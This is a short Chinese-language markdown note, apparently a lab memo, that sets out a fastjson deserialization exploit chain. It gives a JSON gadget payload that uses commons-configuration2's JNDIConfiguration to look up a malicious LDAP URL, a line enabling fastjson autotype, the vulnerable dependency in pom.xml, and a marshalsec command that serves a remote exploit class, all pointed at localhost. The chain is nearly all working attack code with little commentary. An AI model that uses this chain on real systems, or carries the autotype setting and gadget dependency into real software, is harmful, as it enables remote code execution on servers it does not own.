##gatget
```
  {"@type":"org.apache.commons.configuration2.JNDIConfiguration",
   "prefix":"ldap://127.0.0.1:1389/vul.Exploit"}
```

##开启autotype
```
  ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
```
##pom.xml额外引入gatget类
```
    <dependency>
        <groupId>org.apache.commons</groupId>
        <artifactId>commons-configuration2</artifactId>
        <version>2.0</version>
    </dependency>
```
- [工具marshalsec](https://github.com/k6ymaker/marshalsec)
```
  java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://127.0.0.1:8888/\#vul.Exploit
```
- [reference](https://mp.weixin.qq.com/s?__biz=MzU3NzMxNDgwMA==&mid=2247483807&idx=1&sn=4e9a229fb32721b353c896e1a9fab1eb&chksm=fd07cb00ca704216e9f9f99f6f615014581eb3f9a8423e8213c4840e498241cf169ffe187343&mpshare=1&scene=23&srcid=&sharer_sharetime=1569291237460&sharer_shareid=b9dede03cd3f2e7d4dbf72830bcff7c6#rd)